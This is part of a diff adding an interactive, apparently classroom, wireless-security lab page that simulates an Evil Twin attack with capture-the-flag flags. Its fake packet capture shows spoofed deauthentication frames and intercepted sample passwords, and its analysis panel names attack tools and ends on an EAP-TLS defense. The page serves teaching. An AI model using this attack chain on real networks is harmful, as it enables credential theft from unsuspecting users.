+                    isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Deauthentication', spoofedSrc: '00:1A:2B:3C:4D:5E (spoofed)',
+                        reason: 'Class 3 frame received from nonassociated STA',
+                        note: '⚡ Deauth attack! Spoofed to look like it comes from the legitimate AP' },
+                    hex: 'c0 00 00 00 aa bb cc 11 22 33 00 1a 2b 3c 4d 5e ... reason: 0x0007 ...' },
+                { num: 14, time: '10.250', src: 'DE:AD:BE:EF:00:01', dst: 'AA:BB:CC:44:55:66', proto: '802.11',
+                    len: 44, info: 'Deauthentication frame (spoofed from legit BSSID)', type: 'deauth', isDeauth: true,
+                    isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Deauthentication', spoofedSrc: '00:1A:2B:3C:4D:5E (spoofed)',
+                        reason: 'Class 3 frame received from nonassociated STA', note: '⚡ Deauth attack on Bob-Phone' },
+                    hex: 'c0 00 00 00 aa bb cc 44 55 66 ...' },
+                { num: 15, time: '10.300', src: 'DE:AD:BE:EF:00:01', dst: 'AA:BB:CC:77:88:99', proto: '802.11',
+                    len: 44, info: 'Deauthentication frame (spoofed from legit BSSID)', type: 'deauth', isDeauth: true,
+                    isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Deauthentication', spoofedSrc: '00:1A:2B:3C:4D:5E (spoofed)',
+                        reason: 'Class 3 frame received from nonassociated STA',
+                        note: '⚡ Deauth attack on Carol-Laptop' }, hex: 'c0 00 00 00 aa bb cc 77 88 99 ...' },
+            ];
+
+            const roamPackets = [
+                { num: 16, time: '11.000', src: 'AA:BB:CC:11:22:33', dst: 'DE:AD:BE:EF:00:01', proto: '802.11',
+                    len: 98, info: 'Probe Request → Evil Twin, SSID="CompanyWiFi"', type: '802.11', isDeauth: false,
+                    isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Probe Request', target: 'Evil Twin AP', ssid: 'CompanyWiFi',
+                        note: 'Client seeking "CompanyWiFi" — finds Evil Twin with stronger signal' },
+                    hex: '40 00 00 00 ...' },
+                { num: 17, time: '11.050', src: 'DE:AD:BE:EF:00:01', dst: 'AA:BB:CC:11:22:33', proto: '802.11',
+                    len: 112, info: 'Probe Response (Evil Twin), SSID="CompanyWiFi", Ch 11, -40dBm', type: '802.11',
+                    isDeauth: false, isEAPOL: false, isHTTP: false, isSuspicious: true,
+                    detail: { frameType: 'Probe Response', from: 'Evil Twin', signalStrength: '-40 dBm',
+                        note: 'Stronger signal than legitimate AP (-65 dBm). Client will prefer this.' },
+                    hex: '50 00 00 00 ...' },
+                { num: 18, time: '11.200', src: 'AA:BB:CC:11:22:33', dst: 'DE:AD:BE:EF:00:01', proto: '802.11',
+                    len: 86, info: 'Authentication Request → Evil Twin', type: '802.11', isDeauth: false, isEAPOL: false,
+                    isHTTP: false, isSuspicious: true, detail: { frameType: 'Authentication', target: 'Evil Twin',
+                        note: 'Client authenticates to Evil Twin — attacker now controls the connection' },
+                    hex: 'b0 00 00 00 ...' },
+                { num: 19, time: '11.400', src: 'AA:BB:CC:11:22:33', dst: 'DE:AD:BE:EF:00:01', proto: 'HTTP',
+                    len: 530, info: 'POST /login HTTP/1.1 (INTERCEPTED — credentials visible!)', type: 'HTTP',
+                    isDeauth: false, isEAPOL: false, isHTTP: true, isSuspicious: true,
+                    detail: { method: 'POST', uri: '/login', intercepted: true,
+                        body: 'username=alice&password=S3cur3P@ss2024!',
+                        note: '🔴 CREDENTIALS INTERCEPTED! Traffic flows through Evil Twin.' },
+                    hex: '50 4f 53 54 20 2f 6c 6f 67 69 6e ... INTERCEPTED: username=alice&password=S3cur3P@ss2024! ...' },
+                { num: 20, time: '11.800', src: 'AA:BB:CC:44:55:66', dst: 'DE:AD:BE:EF:00:01', proto: 'HTTP',
+                    len: 490, info: 'POST /auth HTTP/1.1 (INTERCEPTED — credentials visible!)', type: 'HTTP',
+                    isDeauth: false, isEAPOL: false, isHTTP: true, isSuspicious: true,
+                    detail: { method: 'POST', uri: '/auth', intercepted: true, body: 'user=bob&pass=MyP@ssword!99',
+                        note: '🔴 CREDENTIALS INTERCEPTED! Bob\'s password captured.' },
+                    hex: '50 4f 53 54 20 2f 61 75 74 68 ... INTERCEPTED: user=bob&pass=MyP@ssword!99 ...' },
+                { num: 21, time: '12.100', src: 'AA:BB:CC:77:88:99', dst: 'DE:AD:BE:EF:00:01', proto: 'HTTP',
+                    len: 520, info: 'POST /signin HTTP/1.1 (INTERCEPTED — credentials visible!)', type: 'HTTP',
+                    isDeauth: false, isEAPOL: false, isHTTP: true, isSuspicious: true,
+                    detail: { method: 'POST', uri: '/signin', intercepted: true,
+                        body: 'login=carol&password=Carol!2024Secure',
+                        note: '🔴 CREDENTIALS INTERCEPTED! Carol\'s password captured.' },
+                    hex: '50 4f 53 54 20 2f 73 69 67 6e 69 6e ... INTERCEPTED: login=carol&password=Carol!2024Secure ...' },
+            ];
+
+            let activePackets = [...allPackets];
+            let displayedPackets = [...allPackets];
+
+            // --- Position calculators ---
+            function getAPPositions() {
+                const viz = document.getElementById('wifi-viz');
+                const rect = viz.getBoundingClientRect();
+                const cx = rect.width / 2;
+                const cy = rect.height / 2;
+                legitAP.x = cx - 180;
+                legitAP.y = cy;
+                evilAP.x = cx + 180;
+                evilAP.y = cy;
+                return { cx, cy, w: rect.width, h: rect.height };
+            }
+
+            function getClientPositions() {
+                const pos = getAPPositions();
+                const baseAP = state.evilTwinActive && state.clientsOnEvilTwin >= state.totalClients ? evilAP : legitAP;
+                const offsets = [
+                    { dx: -30, dy: -40 },
+                    { dx: 20, dy: 50 },
+                    { dx: -10, dy: 10 },
+                ];
+                clients.forEach((c, i) => {
+                    const targetAP = c.connectedTo === 'evil' ? evilAP : legitAP;
+                    const off = offsets[i];
+                    c.x = targetAP.x + off.dx;
+                    c.y = targetAP.y + off.dy;
+                });
+            }
+
+            // --- Render WiFi environment ---
+            function renderWiFiViz() {
+                const container = document.getElementById('ap-container');
+                const clientContainer = document.getElementById('client-container');
+                const svgEl = document.getElementById('conn-svg');
+                const pos = getAPPositions();
+                getClientPositions();
+
+                // Render APs
+                const signalToBars = (strength) => {
+                    const displayStrength = 100 - strength; // invert: lower dBm = better
+                    const bars = Math.ceil(displayStrength / 20);
+                    return Math.min(5, Math.max(1, bars));
+                };
+                const signalClass = (strength) => {
+                    const ds = 100 - strength;
+                    if (ds >= 80) return 'strong';
+                    if (ds >= 50) return 'medium';
+                    return 'weak';
+                };
+
+                const renderAP = (ap) => {
+                    const bars = signalToBars(ap.signalStrength);
+                    const sClass = signalClass(ap.signalStrength);
+                    const barHeights = [0.3, 0.5, 0.65, 0.8, 1.0];
+                    let barsHTML = '';
+                    for (let i = 0; i < 5; i++) {
+                        const h = i < bars ? Math.round(barHeights[i] * 28) : 4;
+                        const bg = i < bars ? `var(--${sClass === 'strong' ? 'success' : sClass === 'medium' ? 'warn' : 'danger'})` :
+                            '#334155';
+                        barsHTML +=
+                            `<div class="signal-bar ${i < bars ? sClass : ''}" style="height:${h}px;background:${bg};"></div>`;
+                    }
+                    const cardClass = ap.isEvil ? 'ap-card evil' : 'ap-card';
+                    const label = ap.isEvil ? '⚠️ Evil Twin (伪造AP)' : '✅ 合法AP';
+                    return `
+                <div class="${cardClass}" data-ap="${ap.isEvil?'evil':'legit'}" style="position:relative;">
+                  <div style="font-size:0.7rem;color:${ap.isEvil?'var(--danger)':'var(--success)'};margin-bottom:4px;">${label}</div>
+                  <div class="ssid">${ap.ssid}</div>
+                  <div class="bssid">BSSID: ${ap.bssid}</div>
+                  <div class="channel">📶 信道 ${ap.channel} | 信号: ${ap.signalStrength} dBm</div>
+                  <div class="signal-bars">${barsHTML}</div>
+                  ${ap.isEvil ? '<div style="font-size:0.7rem;color:var(--danger);margin-top:4px;">⚡ 信号更强 — 客户端优先连接</div>' : ''}
+                </div>`;
+                };
+
+                container.innerHTML = renderAP(legitAP) + renderAP(evilAP);
+
+                // Render clients
+                clientContainer.innerHTML = clients.map((c, i) => {
+                    const connectedLabel = c.connectedTo === 'evil' ?
+                        '<span style="color:var(--danger);font-size:0.6rem;">→ Evil Twin</span>' :
+                        '<span style="color:var(--success);font-size:0.6rem;">→ 合法AP</span>';
+                    return `
+                <div class="client-icon${c.roaming?' roaming':''}" id="client-${c.id}"
+                     style="position:absolute;left:${c.x-16}px;top:${c.y-16}px;transition:all 0.8s cubic-bezier(0.25,0.46,0.45,0.94);"
+                     title="${c.name} (${c.mac}) — ${c.connectedTo==='evil'?'已漫游到Evil Twin':'连接合法AP'}">
+                  ${c.name.split(' ')[0]}<br><span style="font-size:0.55rem;">${c.mac}</span>${connectedLabel}
+                </div>`;
+                }).join('');
+
+                // Render connection lines via SVG
+                let svgLines = '';
+                clients.forEach(c => {
+                    const targetAP = c.connectedTo === 'evil' ? evilAP : legitAP;
+                    const lineClass = c.connectedTo === 'evil' ? 'evil-line' : 'legit-line';
+                    svgLines +=
+                        `<line x1="${c.x}" y1="${c.y}" x2="${targetAP.x}" y2="${targetAP.y}" class="connection-line ${lineClass}" stroke-width="2" opacity="0.7"/>`;
+                });
+                svgEl.innerHTML = svgLines;
+                svgEl.style.width = pos.w + 'px';
+                svgEl.style.height = pos.h + 'px';
+            }
+
+            // --- Render packet list ---
+            function renderPacketList(filter = 'all') {
+                state.currentFilter = filter;
+                if (filter === 'all') displayedPackets = [...activePackets];
+                else if (filter === 'deauth') displayedPackets = activePackets.filter(p => p.isDeauth);
+                else if (filter === 'EAPOL') displayedPackets = activePackets.filter(p => p.isEAPOL);
+                else if (filter === 'HTTP') displayedPackets = activePackets.filter(p => p.isHTTP);
+                else if (filter === '802.11') displayedPackets = activePackets.filter(p => p.type === '802.11' && !p
+                    .isDeauth);
+                else displayedPackets = activePackets.filter(p => p.type === filter);
+
+                const tbody = document.getElementById('packet-tbody');
+                tbody.innerHTML = displayedPackets.map(p => {
+                    let rowClass = '';
+                    if (p.isDeauth) rowClass = 'deauth';
+                    if (p.isEAPOL) rowClass = 'eapol';
+                    if (p.isHTTP) rowClass = 'http';
+                    if (state.selectedPacket && state.selectedPacket.num === p.num) rowClass += ' selected';
+                    const tagState = state.taggedPackets.has(p.num) ? 'tagged' :
+                        (p.isSuspicious ? 'suspicious' : 'normal');
+                    const tagLabel = state.taggedPackets.has(p.num) ? '🏴 已标记' :
+                        (p.isSuspicious ? '⚠ 可疑' : '');
+                    return `
+                <tr class="${rowClass}" data-packet-num="${p.num}" onclick="selectPacket(${p.num})">
+                  <td>${p.num}</td><td>${p.time}</td><td style="font-size:0.68rem;">${p.src}</td><td style="font-size:0.68rem;">${p.dst}</td>
+                  <td>${p.proto}</td><td>${p.len}</td><td style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${p.info}</td>
+                  <td>${tagLabel ? `<span class="tag-badge ${tagState}" onclick="event.stopPropagation();toggleTag(${p.num})">${tagLabel}</span>` : `<span class="tag-badge normal" onclick="event.stopPropagation();toggleTag(${p.num})">○</span>`}</td>
+                </tr>`;
+                }).join('');
+            }
+
+            function selectPacket(num) {
+                const pkt = activePackets.find(p => p.num === num);
+                if (!pkt) return;
+                state.selectedPacket = pkt;
+                renderPacketList(state.currentFilter);
+                renderPacketDetail(pkt);
+            }
+
+            function toggleTag(num) {
+                if (state.taggedPackets.has(num)) {
+                    state.taggedPackets.delete(num);
+                } else {
+                    state.taggedPackets.add(num);
+                }
+                renderPacketList(state.currentFilter);
+                updateVerifyButton();
+            }
+
+            function updateVerifyButton() {
+                const btn = document.getElementById('btn-verify-tags');
+                if (state.taggedPackets.size >= 3 && state.phase === 'clients_roamed') {
+                    btn.disabled = false;
+                    btn.textContent = '✅ 验证标记 (' + state.taggedPackets.size + '个)';
+                } else if (state.taggedPackets.size > 0) {
+                    btn.textContent = '✅ 验证标记 (' + state.taggedPackets.size + '个)';
+                    if (state.phase < 'clients_roamed') btn.disabled = true;
+                    else btn.disabled = false;
+                } else {
+                    btn.disabled = true;
+                    btn.textContent = '✅ 验证标记';
+                }
+            }
+
+            function renderPacketDetail(pkt) {
+                const detailDiv = document.getElementById('packet-detail');
+                let html = `<div style="color:var(--cyan);font-weight:600;margin-bottom:8px;">帧 ${pkt.num} — ${pkt.proto} — ${pkt.info}</div>`;
+                html += `<div style="margin-bottom:6px;"><span class="field">源MAC:</span> <span class="value">${pkt.src}</span></div>`;
+                html += `<div><span class="field">目的MAC:</span> <span class="value">${pkt.dst}</span></div>`;
+                if (pkt.detail) {
+                    html += '<div style="margin-top:8px;border-top:1px solid #334155;padding-top:8px;">';
+                    for (const [key, val] of Object.entries(pkt.detail)) {
+                        if (key === 'note') {
+                            html +=
+                                `<div style="color:var(--warn);margin-top:4px;background:rgba(245,158,11,0.1);padding:4px 8px;border-radius:4px;">⚠️ ${val}</div>`;
+                        } else {
+                            html +=
+                                `<div><span class="field">${key}:</span> <span class="value">${val}</span></div>`;
+                        }
+                    }
+                    html += '</div>';
+                }
+                // Hex dump
+                html +=
+                    '<div style="margin-top:10px;border-top:1px solid #334155;padding-top:8px;font-family:var(--mono);font-size:0.68rem;">';
+                html += '<div style="color:var(--text2);">Hex Dump:</div>';
+                html +=
+                    `<div class="hex-dump-line"><span class="hex-offset">0000</span> <span class="hex-byte">${pkt.hex}</span></div>`;
+                html += '</div>';
+                detailDiv.innerHTML = html;
+            }
+
+            function filterPackets(filter) {
+                renderPacketList(filter);
+            }
+
+            function verifyTaggedPackets() {
+                const suspiciousNums = activePackets.filter(p => p.isSuspicious).map(p => p.num);
+                const allTagged = suspiciousNums.every(n => state.taggedPackets.has(n));
+                if (allTagged && state.taggedPackets.size >= suspiciousNums.length) {
+                    showFlag('FLAG{packet_analysis_deauth_identified}');
+                    document.getElementById('attack-feedback').innerHTML =
+                        '✅ <span style="color:#22c55e;">优秀！你正确识别了所有可疑数据包（Evil Twin Beacon + Deauth帧 + 漫游流量）。攻击时间线已确认。</span>';
+                    advancePhase('credentials_captured');
+                } else {
+                    document.getElementById('attack-feedback').innerHTML =
+                        '⚠️ <span style="color:#f59e0b;">部分可疑包未标记。请仔细检查：Evil Twin的Beacon帧、Deauth攻击帧、以及客户端漫游到Evil Twin的流量。</span>';
+                }
+            }
+
+            // --- Actions ---
+            function deployEvilTwin() {
+                if (state.evilTwinActive) return;
+                state.evilTwinActive = true;
+                state.phase = 'evil_twin_deployed';
+                // Add Evil Twin packets
+                activePackets = [...allPackets, ...evilTwinPackets];
+                displayedPackets = [...activePackets];
+                renderWiFiViz();
+                renderPacketList(state.currentFilter);
+                document.getElementById('btn-deploy-evil-twin').disabled = true;
+                document.getElementById('btn-deploy-evil-twin').textContent = '✅ Evil Twin 已部署';
+                document.getElementById('btn-deauth').disabled = false;
+                document.getElementById('attack-feedback').innerHTML =
+                    '📡 <span style="color:#f59e0b;">Evil Twin AP 已部署！SSID="CompanyWiFi"，信道11，信号强度-40dBm（强于合法AP的-65dBm）。客户端尚未漫游——需要Deauth攻击强制断开。</span>';
+                updateProgress(2);
+                showFlag('FLAG{evil_twin_deployed_ssid_spoof}');
+                setTimeout(() => {
+                    document.getElementById('briefing').querySelector('span').textContent =
+                        '🔍 步骤 2/6 — Evil Twin已部署。注意新出现的Beacon帧（数据包#12）。下一步：发送Deauth攻击。';
+                }, 600);
+            }
+
+            function sendDeauth() {
+                if (state.deauthSent || !state.evilTwinActive) return;
+                state.deauthSent = true;
+                state.phase = 'deauth_sent';
+                // Add deauth packets
+                activePackets = [...activePackets, ...deauthPackets];
+                displayedPackets = [...activePackets];
+                renderPacketList(state.currentFilter);
+                document.getElementById('btn-deauth').disabled = true;
+                document.getElementById('btn-deauth').textContent = '⚡ Deauth 已发送';
+                document.getElementById('attack-feedback').innerHTML =
+                    '⚡ <span style="color:#ef4444;">Deauth攻击帧已发送！伪造源MAC为合法AP，强制断开所有客户端。观察客户端行为...</span>';
+                updateProgress(3);
+                showFlag('FLAG{deauth_attack_frames_sent}');
+                // Simulate clients roaming after delay
+                setTimeout(() => {
+                    roamClientsToEvilTwin();
+                }, 2000);
+            }
+
+            function roamClientsToEvilTwin() {
+                state.phase = 'clients_roamed';
+                state.clientsOnEvilTwin = state.totalClients;
+                clients.forEach(c => { c.connectedTo = 'evil';
+                    c.roaming = true; });
+                // Add roam packets
+                activePackets = [...activePackets, ...roamPackets];
+                displayedPackets = [...activePackets];
+                renderWiFiViz();
+                renderPacketList(state.currentFilter);
+                document.getElementById('attack-feedback').innerHTML =
+                    '🔴 <span style="color:#ef4444;">所有客户端已漫游到Evil Twin！所有流量现在流经攻击者。查看数据包#19-#21，凭证已暴露！点击HTTP数据包查看截获的凭证。</span>';
+                document.getElementById('btn-inject-js').disabled = false;
+                updateProgress(4);
+                updateVerifyButton();
+                showFlag('FLAG{clients_roamed_to_evil_twin}');
+                // Auto-display credentials
+                setTimeout(() => {
+                    displayCredentials();
+                }, 800);
+                setTimeout(() => {
+                    document.getElementById('briefing').querySelector('span').textContent =
+                        '🔍 步骤 4/6 — 客户端已漫游。在数据包列表中标记所有可疑数据包，然后点击"验证标记"。';
+                }, 1200);
+            }
+
+            function displayCredentials() {
+                const area = document.getElementById('credential-capture-area');
+                if (state.credentialsCaptured.length > 0) return;
+                state.credentialsCaptured = [
+                    { user: 'alice', pass: 'S3cur3P@ss2024!', source: 'POST /login' },
+                    { user: 'bob', pass: 'MyP@ssword!99', source: 'POST /auth' },
+                    { user: 'carol', pass: 'Carol!2024Secure', source: 'POST /signin' },
+                ];
+                state.phase = 'credentials_captured';
+                area.innerHTML = '<h4 style="color:var(--danger);margin-bottom:8px;">🔴 截获的凭证：</h4>' +
+                    state.credentialsCaptured.map(c =>
+                        `<div class="cred-card"><span class="key">用户:</span> <span class="val">${c.user}</span> | <span class="key">密码:</span> <span class="val">${c.pass}</span> | <span class="key">来源:</span> ${c.source}</div>`
+                    ).join('');
+                showFlag('FLAG{credentials_intercepted_clear_text}');
+                updateProgress(4);
+            }
+
+            function showJSInject() {
+                document.getElementById('js-inject-area').style.display = 'block';
+                document.getElementById('attack-feedback').innerHTML =
+                    '💉 <span style="color:#f59e0b;">在下方输入JavaScript代码，模拟攻击者向HTTP响应中注入恶意脚本。这将影响所有通过Evil Twin浏览网页的客户端。</span>';
+            }
+
+            function executeJSInject() {
+                const payload = document.getElementById('js-payload-input').value.trim();
+                if (!payload) {
+                    document.getElementById('js-inject-result').innerHTML =
+                        '<span style="color:#ef4444;">请输入JavaScript代码。</span>';
+                    return;
+                }
+                state.jsInjected = true;
+                state.phase = 'js_injected';
+                document.getElementById('js-inject-result').innerHTML = `
+              <div style="background:#1a0a0a;border:1px solid var(--danger);border-radius:8px;padding:12px;margin-top:8px;">
+                <strong style="color:#ef4444;">✅ 脚本已注入到HTTP响应流</strong><br>
+                <span style="font-size:0.75rem;color:#94a3b8;">模拟受害者浏览器执行：</span>
+                <div style="background:#000;padding:8px;border-radius:4px;margin-top:4px;font-family:var(--mono);font-size:0.7rem;color:#22c55e;">
+                  [Victim Browser Console]<br>
+                  > ${escapeHTML(payload)}<br>
+                  > <span style="color:#f59e0b;">⚠ 脚本已执行 — Cookie/数据可能已泄露到攻击者服务器</span>
+                </div>
+              </div>`;
+                document.getElementById('btn-inject-js').disabled = true;
+                document.getElementById('btn-inject-js').textContent = '✅ JS已注入';
+                updateProgress(5);
+                showFlag('FLAG{js_injected_xss_payload}');
+                setTimeout(() => {
+                    document.getElementById('briefing').querySelector('span').textContent =
+                        '🔍 步骤 5/6 — JS注入完成。现在请配置防御方案来阻止此类攻击。点击"配置防御"按钮。';
+                }, 600);
+            }
+
+            function showDefensePanel() {
+                document.getElementById('defense-panel').style.display = 'block';
+                document.getElementById('defense-panel').scrollIntoView({ behavior: 'smooth' });
+                document.getElementById('attack-feedback').innerHTML =
+                    '🛡️ <span style="color:#22c55e;">防御面板已展开。选择正确的认证方案来阻止Evil Twin攻击。</span>';
+            }
+
+            function selectDefenseOption(el) {
+                document.querySelectorAll('.defense-option').forEach(o => o.classList.remove('selected'));
+                el.classList.add('selected');
+                state.selectedDefense = el.dataset.opt;
+                document.getElementById('btn-confirm-defense').disabled = false;
+            }
+
+            function confirmDefense() {
+                if (state.selectedDefense === 'eap-tls') {
+                    state.defenseCorrect = true;
+                    state.phase = 'defense_configured';
+                    document.getElementById('defense-result').innerHTML = `
+                <div style="background:#152618;border:2px solid var(--success);border-radius:10px;padding:14px;margin-top:8px;">
+                  <strong style="color:#22c55e;">✅ 正确！802.1X + EAP-TLS 是防御Evil Twin的最佳方案</strong><br><br>
+                  <span style="font-size:0.8rem;">
+                  <strong>工作原理：</strong><br>
+                  1. RADIUS服务器持有受信任的证书<br>
+                  2. 客户端连接时，AP必须出示有效的服务器证书<br>
+                  3. 客户端验证证书链（由受信任CA签发）<br>
+                  4. Evil Twin无法伪造合法证书 → 客户端拒绝连接<br>
+                  5. 双向认证：网络验证客户端，客户端也验证网络<br><br>
+                  <strong style="color:#22c55e;">✅ Evil Twin攻击被完全阻止！</strong>
+                  </span>
+                </div>`;
+                    updateProgress(6);
+                    showFlag('FLAG{eap_tls_defense_configured}');
+                    document.getElementById('btn-confirm-defense').disabled = true;
+                    document.getElementById('btn-confirm-defense').textContent = '✅ 防御已配置';
+                    // Simulate clients reconnecting to legit AP
+                    setTimeout(() => {
+                        clients.forEach(c => { c.connectedTo = 'legit';
+                            c.roaming = true; });
+                        state.clientsOnEvilTwin = 0;
+                        renderWiFiViz();
+                        document.getElementById('attack-feedback').innerHTML =
+                            '🛡️ <span style="color:#22c55e;">EAP-TLS已生效！客户端重新连接到合法AP（证书验证通过）。Evil Twin无法提供有效证书，攻击失败。</span>';
+                        setTimeout(() => {
+                            document.getElementById('briefing').querySelector('span').textContent =
+                                '🎉 实验完成！所有6个步骤已完成。点击下方"查看完整分析"了解攻击链和防御细节。';
+                        }, 500);
+                    }, 1500);
+                } else {
+                    document.getElementById('defense-result').innerHTML = `
+                <div style="background:#1a0a0a;border:1px solid var(--danger);border-radius:8px;padding:12px;margin-top:8px;">
+                  <span style="color:#ef4444;">❌ 此方案无法有效防御Evil Twin攻击。</span><br>
+                  <span style="font-size:0.78rem;color:#94a3b8;">
+                  ${state.selectedDefense === 'wpa2-psk' ? 'WPA2-PSK仅验证密码，Evil Twin知道密码后即可冒充合法AP。' : ''}
+                  ${state.selectedDefense === 'open' ? '开放网络无任何认证，攻击极其容易。' : ''}
+                  ${state.selectedDefense === 'mac-filter' ? 'MAC地址可被嗅探和伪造，无法阻止Evil Twin。' : ''}
+                  请选择<strong>802.1X + EAP-TLS</strong>（基于证书的相互认证）。
+                  </span>
+                </div>`;
+                }
+            }
+
+            // --- Flags ---
+            function showFlag(flagText) {
+                if (state.flagsClaimed.includes(flagText)) return;
+                state.flagsClaimed.push(flagText);
+                const container = document.getElementById('flag-toast-container');
+                const toast = document.createElement('div');
+                toast.className = 'flag-toast';
+                toast.textContent = '🏆 ' + flagText;
+                container.appendChild(toast);
+                setTimeout(() => {
+                    toast.classList.add('fade-out');
+                    setTimeout(() => toast.remove(), 500);
+                }, 3500);
+            }
+
+            // --- Progress ---
+            function updateProgress(step) {
+                const steps = document.querySelectorAll('.progress-step');
+                const conns = document.querySelectorAll('.progress-connector');
+                steps.forEach(s => {
+                    const sNum = parseInt(s.dataset.step);
+                    if (sNum < step) s.classList.add('done');
+                    if (sNum === step) { s.classList.add('active');
+                        s.classList.remove('done'); }
+                    if (sNum > step) { s.classList.remove('active', 'done'); }
+                });
+                conns.forEach(c => {
+                    const cNum = parseInt(c.dataset.conn);
+                    if (cNum < step) c.classList.add('done');
+                    else c.classList.remove('done');
+                });
+            }
+
+            function advancePhase(newPhase) {
+                state.phase = newPhase;
+                if (newPhase === 'credentials_captured') {
+                    displayCredentials();
+                    updateProgress(4);
+                }
+                if (newPhase === 'defense_configured') {
+                    updateProgress(6);
+                }
+            }
+
+            // --- Utility ---
+            function escapeHTML(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            // --- Analysis ---
+            window.closeAnalysis = function() {
+                document.getElementById('analysis-modal').style.display = 'none';
+            };
+            window.showAnalysis = function() {
+                const content = document.getElementById('analysis-content');
+                content.innerHTML = `
+            <h3 style="color:var(--warn);">🔬 Evil Twin 攻击完整分析</h3>
+            <pre>
+            ╔══════════════════════════════════════════════╗
+            ║   Evil Twin Attack — 攻击链分析            ║
+            ╚══════════════════════════════════════════════╝
+
+            【攻击阶段】
+            1. 侦查 (Reconnaissance)
+               - 攻击者扫描目标区域的WiFi网络
+               - 识别目标SSID: "CompanyWiFi"
+               - 记录BSSID、信道、信号强度、安全类型
+
+            2. 部署Evil Twin (Evil Twin Deployment)
+               - 使用软件（如airbase-ng、hostapd-wpe）创建伪造AP
+               - SSID设置为与目标完全相同: "CompanyWiFi"
+               - 使用更强的发射功率（信号强度-40dBm vs 合法-65dBm）
+               - 802.11协议规定：客户端优先选择信号更强的AP
+
+            3. Deauthentication攻击 (Deauth Attack)
+               - 发送伪造的802.11 Deauthentication帧
+               - 源MAC地址伪造成合法AP的BSSID
+               - 强制断开所有已连接客户端
+               - 客户端重新扫描WiFi → 发现Evil Twin（信号更强）
+
+            4. 凭证截获 (Credential Interception)
+               - 客户端连接到Evil Twin后，所有流量经过攻击者
+               - HTTP明文流量中的用户名/密码完全可见
+               - 即使HTTPS，也可能通过SSLstrip降级攻击截获
+
+            5. JavaScript注入 (JS Injection)
+               - 攻击者修改HTTP响应，注入恶意脚本
+               - 可窃取Cookie、会话令牌、键盘输入
+               - 类似于中间人攻击中的内容篡改
+
+            【防御方案：802.1X/EAP-TLS】
+            ┌─────────────────────────────────────────┐
+            │ 组件          │ 作用                    │
+            ├─────────────────────────────────────────┤
+            │ Supplicant    │ 客户端认证软件          │
+            │ Authenticator │ AP/交换机（转发认证）    │
+            │ RADIUS Server │ 认证服务器+证书存储     │
+            │ CA证书        │ 签发服务器&客户端证书   │
+            │ 服务器证书    │ 证明AP身份的真实性      │
+            │ 客户端证书    │ 证明用户身份的合法性    │
+            └─────────────────────────────────────────┘
+
+            为什么EAP-TLS能防御Evil Twin？
+            - 客户端连接前，AP必须出示有效的服务器证书
+            - 证书由受信任的CA签发，客户端验证证书链
+            - Evil Twin无法获取合法证书 → 证书验证失败
+            - 客户端拒绝连接，攻击完全失败
+            - 双向认证确保双方身份真实
+
+            【真实世界参考】
+            - CWE-287: Improper Authentication
+            - CWE-306: Missing Authentication for Critical Function
+            - MITRE ATT&CK TA0006: Credential Access
+            - T1056: Input Capture (凭证截获)
+            - T1557: Adversary-in-the-Middle (中间人攻击)
+
+            // EDUCATIONAL PURPOSE ONLY — authorized classroom use
+            </pre>`;
+                document.getElementById('analysis-modal').style.display = 'flex';
+            };
+
+            // --- Init ---
+            function init() {
+                getAPPositions();
+                getClientPositions();
+                renderWiFiViz();
+                renderPacketList('all');
+                updateProgress(1);
+                document.getElementById('packet-detail').innerHTML =
+                    '<span style="color:#64748b;">← 点击左侧数据包以查看详情。注意观察Beacon帧中的SSID和信道信息。</span>';
+                // Add analysis button
+                const attackPanel = document.getElementById('attack-panel');
+                const analysisBtn = document.createElement('button');
+                analysisBtn.className = 'primary';
+                analysisBtn.textContent = '📋 查看完整分析';
+                analysisBtn.style.marginLeft = '12px';
+                analysisBtn.onclick = window.showAnalysis;
+                attackPanel.querySelector('div').appendChild(analysisBtn);
+                updateVerifyButton();
+                // Resize handler
+                window.addEventListener('resize', () => {
+                    getAPPositions();
+                    getClientPositions();
+                    renderWiFiViz();
+                });
+            }
+
+            // --- Expose to global scope ---
+            window.selectPacket = selectPacket;
+            window.toggleTag = toggleTag;
+            window.filterPackets = filterPackets;
+            window.verifyTaggedPackets = verifyTaggedPackets;
+            window.deployEvilTwin = deployEvilTwin;
+            window.sendDeauth = sendDeauth;
+            window.showJSInject = showJSInject;
+            window.executeJSInject = executeJSInject;
+            window.showDefensePanel = showDefensePanel;
+            window.selectDefenseOption = selectDefenseOption;
+            window.confirmDefense = confirmDefense;
+            window.showAnalysis = window.showAnalysis;
+            window.closeAnalysis = window.closeAnalysis;
+
+            init();
+            console.log(
+                '// EDUCATIONAL PURPOSE ONLY — authorized classroom use\n// Wireless Security Lab: Evil Twin Attack Simulation\n// Defense: 802.1X/EAP-TLS certificate-based mutual authentication'
+                );
+        })();
+    </script>
+</body>
+</html>
